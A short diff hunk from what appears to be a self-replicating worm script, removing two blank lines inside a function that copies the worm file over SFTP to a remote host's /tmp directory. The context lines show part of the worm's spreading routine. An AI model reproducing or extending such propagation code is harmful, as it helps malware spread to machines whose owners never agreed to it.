@@ -82,8 +82,6 @@ def spreadAndExecute(sshClient,systemIP1):
 
 	if systemIP1 != ORIGIN_IP:
 		sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
-
-
 	else:
 		sftpClient.put("replicator_worm.py","/tmp/replicator_worm.py")
 
